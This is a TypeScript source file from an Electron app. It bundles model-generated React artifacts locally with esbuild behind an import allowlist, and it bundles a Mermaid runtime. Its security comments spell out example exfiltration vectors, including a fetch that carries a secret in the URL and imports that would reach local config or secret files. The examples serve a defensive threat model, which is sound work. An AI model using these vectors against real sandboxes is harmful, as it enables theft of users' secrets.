import type { IpcMain } from 'electron';
import { app } from 'electron';
import { createHash } from 'crypto';
import { sep } from 'path';

/**
 * Bundles model-generated React artifacts LOCALLY (esbuild + the React copies
 * already in node_modules) into a single self-contained IIFE.
 *
 * SECURITY: the whole point of this handler is to remove the artifact iframe's
 * network dependency. The previous renderer pulled React + Babel-standalone
 * from unpkg.com, which forced the iframe CSP to allow that origin — and any
 * allowed origin in a sandbox that runs untrusted model code is a
 * data-exfiltration channel (`fetch('https://unpkg.com/?<secret>')`, injected
 * `<script src>`, etc.). By bundling here we can serve the artifact with a
 * fully network-free CSP (`connect-src 'none'`, no remote `script-src`).
 *
 * The bundle contains no remote references: the only http(s) URLs in a
 * production React build are the `react.dev/errors/` decoder string (never
 * fetched) and XML namespace URIs — both inert, and blocked anyway by the
 * iframe's `connect-src 'none'`.
 */

export type BundleReactResult = { ok: true; code: string } | { ok: false; error: string };

/**
 * True when the artifact source already creates a binding for the identifier
 * `React` — a default import (`import React from 'react'`), a namespace import
 * (`import * as React from 'react'`), or a named `React` import. A NAMED-ONLY
 * import (e.g. `import { useState } from 'react'`) does NOT bind `React`, so an
 * artifact that references `React.*` still needs the injected alias. Exported
 * for unit testing.
 */
export function artifactBindsReact(source: string): boolean {
  const importRe = /^\s*import\s+([^;]*?)\s+from\s+['"]react['"]/gm;
  let m: RegExpExecArray | null;
  while ((m = importRe.exec(source)) !== null) {
    const clause = m[1];
    // Default import: `React` / `React, { ... }` (identifier before any `{`/`*`)
    if (/^\s*React\b/.test(clause)) return true;
    // Namespace import: `* as React`
    if (/\*\s*as\s+React\b/.test(clause)) return true;
    // Named import that includes `React` (or `X as React`)
    const named = /\{([^}]*)\}/.exec(clause);
    if (named && /(^|,)\s*(?:\w+\s+as\s+)?React\s*(,|$)/.test(named[1])) return true;
  }
  return false;
}

/** Reject pathologically large sources before handing them to esbuild. */
const MAX_SOURCE_BYTES = 512 * 1024;

/** Bounded LRU-ish cache keyed by a hash of the raw source. */
const MAX_CACHE_ENTRIES = 50;
const cache = new Map<string, string>();

function cacheGet(key: string): string | undefined {
  const hit = cache.get(key);
  if (hit !== undefined) {
    // Refresh recency: re-insert so eviction targets genuinely cold entries.
    cache.delete(key);
    cache.set(key, hit);
  }
  return hit;
}

function cacheSet(key: string, code: string): void {
  cache.set(key, code);
  while (cache.size > MAX_CACHE_ENTRIES) {
    const oldest = cache.keys().next().value;
    if (oldest === undefined) break;
    cache.delete(oldest);
  }
}

/**
 * Turn the raw artifact source into a bundle-able module:
 *  - `export default X`  → `const __ArtifactRoot = X` (esbuild strips exports
 *    from an IIFE anyway; we bind it to a known name we can reference).
 *  - `export const/let/var/function/class` → strip the leading `export`.
 * Then append a bootstrap that mounts the component and reports errors into
 * `#root` as a red <pre>.
 */
function wrapSource(source: string): string {
  const normalized = source
    .replace(/^\s*export\s+default\s+/m, 'const __ArtifactRoot = ')
    .replace(/^\s*export\s+(?=(const|let|var|function|class)\b)/gm, '');

  // A named-only import (e.g. `import { useState } from 'react'`) does NOT bind
  // `React`, so an artifact that also references `React.*` still needs the alias.
  // Only suppress it when a real `React` binding already exists (else our
  // `import * as React` would be a duplicate declaration).
  const reactAlias = artifactBindsReact(source) ? '' : `import * as React from 'react';\n`;

  // Internal-only bindings (double-underscore names avoid clashing with any
  // artifact identifier). `jsx: 'automatic'` handles JSX syntax itself.
  const prelude = `${reactAlias}import * as __ArtifactReact from 'react';\nimport { createRoot as __artifactCreateRoot } from 'react-dom/client';\n`;

  const bootstrap = `
;(function () {
  var __rootEl = document.getElementById('root');
  function __fail(msg) {
    if (__rootEl) {
      var pre = document.createElement('pre');
      pre.style.cssText = 'padding:1rem;color:#b91c1c;white-space:pre-wrap;word-break:break-word';
      pre.textContent = String(msg);
      __rootEl.innerHTML = '';
      __rootEl.appendChild(pre);
    }
  }
  try {
    var __c =
      (typeof __ArtifactRoot !== 'undefined' && __ArtifactRoot) ||
      (typeof App !== 'undefined' && App) ||
      (typeof Component !== 'undefined' && Component) ||
      null;
    if (!__c) {
      __fail('No component named App or Component was exported.');
      return;
    }
    if (!__rootEl) {
      __fail('Internal error: #root not found.');
      return;
    }
    __artifactCreateRoot(__rootEl).render(__ArtifactReact.createElement(__c));
  } catch (e) {
    __fail((e && e.stack) || e);
  }
})();
`;

  return `${prelude}${normalized}\n${bootstrap}`;
}

// Only these modules may be imported by (or on behalf of) artifact source. This
// prevents a malicious artifact from importing arbitrary local files — e.g.
// `import cfg from '/Users/.../.kai/config.json'` — which esbuild would
// otherwise resolve and inline into the bundle, exfiltrating secrets.
const IMPORT_ALLOWLIST = new Set([
  'react',
  'react-dom',
  'react-dom/client',
  'react/jsx-runtime',
  'react/jsx-dev-runtime',
]);

async function bundleReact(source: string): Promise<BundleReactResult> {
  if (typeof source !== 'string') {
    return { ok: false, error: 'Invalid source.' };
  }
  if (Buffer.byteLength(source, 'utf8') > MAX_SOURCE_BYTES) {
    return { ok: false, error: 'Artifact source exceeds the 512KB bundling limit.' };
  }

  const key = createHash('sha256').update(source).digest('hex');
  const cached = cacheGet(key);
  if (cached !== undefined) {
    return { ok: true, code: cached };
  }

  try {
    // Dynamic import so esbuild stays external (it locates its native binary
    // via a relative path and breaks if bundled into the main JS).
    const esbuild = await import('esbuild');
    type EsbuildPlugin = Parameters<typeof esbuild.build>[0] extends { plugins?: (infer P)[] } ? P : never;
    // Resolve `react` / `react-dom/client` from the app's node_modules. In dev
    // this is the repo root; in a packaged build the app path is inside
    // `app.asar`, which esbuild's native service cannot read — React is
    // asarUnpack'd (see electron-builder.yml), so point esbuild at the
    // unpacked path instead.
    const resolveDir = app.getAppPath().replace(/app\.asar(?=[/\\]|$)/, 'app.asar.unpacked');
    // The app's own node_modules root — only importers UNDER this path are
    // trusted to resolve freely (React's transitive deps). Using an anchored
    // prefix (not a bare `.includes('node_modules')`) means the allowlist still
    // holds even if the app itself lives beneath a `node_modules` directory.
    const nodeModulesRoot = resolveDir.replace(/[/\\]$/, '') + sep + 'node_modules' + sep;

    const result = await esbuild.build({
      stdin: {
        contents: wrapSource(source),
        resolveDir,
        loader: 'tsx',
        sourcefile: 'artifact.tsx',
      },
      bundle: true,
      format: 'iife',
      minify: true,
      write: false,
      // Automatic JSX runtime → artifact JSX doesn't need a `React` global.
      jsx: 'automatic',
      // Production React needs no `unsafe-eval`; dev React would. Force prod.
      define: { 'process.env.NODE_ENV': '"production"' },
      logLevel: 'silent',
      // Allowlist plugin: reject any import from artifact source except React.
      // Prevents inlining arbitrary local files (secret exfiltration).
      plugins: [
        {
          name: 'artifact-import-allowlist',
          setup(build) {
            build.onResolve({ filter: /.*/ }, async (args) => {
              if (args.kind === 'entry-point') return null;

              // Recursion guard: our own build.resolve() call below re-enters this
              // hook. When it does, delegate to esbuild's default resolver (the
              // path was already allowlisted + is being validated).
              if ((args.pluginData as { __allowlistResolving?: boolean } | undefined)?.__allowlistResolving) {
                return null;
              }

              // React's own transitive imports resolve normally — but ONLY when
              // the importer is a real file under the app's OWN node_modules root
              // (resolveDir/node_modules). A bare `.includes('node_modules')`
              // check would disable the whole allowlist if the app itself is
              // installed/checked-out beneath a `node_modules` path, letting
              // artifact imports reach arbitrary files.
              if (args.importer.startsWith(nodeModulesRoot)) return null;

              // Everything else originates from the ARTIFACT source. It may ONLY
              // reference the allowlisted React bare specifiers. Relative and
              // absolute imports are rejected outright — otherwise a model could
              // reach arbitrary files (`../../secret`) or arbitrary packages via
              // `./node_modules/<pkg>` (whose resolved path contains
              // node_modules but is not React).
              if (!IMPORT_ALLOWLIST.has(args.path)) {
                return {
                  errors: [
                    {
                      text: `Import of "${args.path}" is not allowed in React artifacts (only 'react', 'react-dom', and 'react-dom/client' may be imported).`,
                    },
                  ],
                };
              }

              // Defense in depth: the name is allowlisted, but WHERE it resolves
              // is not guaranteed to be React. A tsconfig path-mapping, a symlink,
              // or a missing local package could resolve `react` to a file OUTSIDE
              // the app's node_modules. Resolve it ourselves and reject if the
              // result escapes nodeModulesRoot, so the allowlist can't be turned
              // into an arbitrary-file read via resolver state.
              const resolved = await build.resolve(args.path, {
                kind: args.kind,
                importer: args.importer,
                resolveDir: args.resolveDir,
                pluginData: { __allowlistResolving: true },
              });
              if (resolved.errors.length > 0) return resolved;
              if (!resolved.path.startsWith(nodeModulesRoot)) {
                return {
                  errors: [
                    {
                      text: `Import of "${args.path}" resolved outside the app's node_modules ("${resolved.path}") and was rejected.`,
                    },
                  ],
                };
              }
              return resolved;
            });
          },
        } as EsbuildPlugin,
      ],
    });

    const out = result.outputFiles?.[0]?.text;
    if (!out) {
      return { ok: false, error: 'Bundler produced no output.' };
    }
    cacheSet(key, out);
    return { ok: true, code: out };
  } catch (err) {
    const message = err instanceof Error ? err.message : String(err);
    return { ok: false, error: message };
  }
}

export function registerArtifactBundleHandlers(ipcMain: IpcMain): void {
  ipcMain.handle('artifact:bundle-react', (_event, payload: { source: string }): Promise<BundleReactResult> => {
    const source = payload && typeof payload === 'object' ? payload.source : undefined;
    return bundleReact(source as string);
  });
  ipcMain.handle('artifact:bundle-mermaid', (): Promise<BundleReactResult> => bundleMermaidRuntime());
}

// ---------------------------------------------------------------------------
// Mermaid runtime bundle
// ---------------------------------------------------------------------------

/**
 * The mermaid render runtime, bundled ONCE (independent of any diagram) into a
 * self-contained IIFE that exposes `window.__renderMermaid(source, isDark)` →
 * Promise. It initializes mermaid with `startOnLoad:false` + `securityLevel:
 * 'strict'` (mermaid sanitizes labels; the diagram source is model-generated so
 * we keep the strict default rather than the plugin's 'loose'), renders the
 * source, and returns the SVG string. The diagram source itself is NEVER passed
 * through esbuild — it's injected as a runtime string by the renderer wrapper —
 * so there's no untrusted-import surface here; the only import is our trusted
 * `mermaid`. Cached under a constant key (same bundle every call).
 */
const MERMAID_ENTRY = `
import mermaid from 'mermaid';

window.__renderMermaid = async function (source, isDark) {
  mermaid.initialize({
    startOnLoad: false,
    securityLevel: 'strict',
    theme: isDark ? 'dark' : 'default',
    fontFamily: 'ui-sans-serif, system-ui, sans-serif',
  });
  const id = 'artifact-mermaid-' + Math.random().toString(36).slice(2, 10);
  const { svg } = await mermaid.render(id, source);
  return svg;
};
`;

const MERMAID_CACHE_KEY = 'mermaid-runtime-v1';

async function bundleMermaidRuntime(): Promise<BundleReactResult> {
  const cached = cacheGet(MERMAID_CACHE_KEY);
  if (cached !== undefined) return { ok: true, code: cached };

  // Prefer the prebuilt runtime shipped as an app resource (built at package
  // time by scripts/build-mermaid-runtime.mjs → resources/mermaid-runtime.js).
  // This avoids esbuilding ~58 packages / ~3.3 MB at render time and avoids
  // asarUnpacking the whole mermaid dep tree.
  try {
    const { readFileSync, existsSync } = await import('node:fs');
    const { join } = await import('node:path');
    const prebuilt = join(process.resourcesPath ?? '', 'mermaid-runtime.js');
    if (process.resourcesPath && existsSync(prebuilt)) {
      const code = readFileSync(prebuilt, 'utf8');
      cacheSet(MERMAID_CACHE_KEY, code);
      return { ok: true, code };
    }
  } catch {
    // fall through to the dev-time live bundle
  }

  // Dev fallback (no packaged resource): esbuild the fixed runtime live from the
  // repo's node_modules. Slow first time, but only hit in `pnpm dev`.
  try {
    const esbuild = await import('esbuild');
    const resolveDir = app.getAppPath().replace(/app\.asar(?=[/\\]|$)/, 'app.asar.unpacked');
    const result = await esbuild.build({
      stdin: { contents: MERMAID_ENTRY, resolveDir, loader: 'ts', sourcefile: 'mermaid-entry.ts' },
      bundle: true,
      format: 'iife',
      minify: true,
      write: false,
      define: { 'process.env.NODE_ENV': '"production"' },
      logLevel: 'silent',
    });
    const out = result.outputFiles?.[0]?.text;
    if (!out) return { ok: false, error: 'Bundler produced no output.' };
    cacheSet(MERMAID_CACHE_KEY, out);
    return { ok: true, code: out };
  } catch (err) {
    return { ok: false, error: err instanceof Error ? err.message : String(err) };
  }
}

/** Test-only exposure of the bundler for end-to-end import-allowlist coverage. */
export const __internal = { bundleReact, bundleMermaidRuntime };
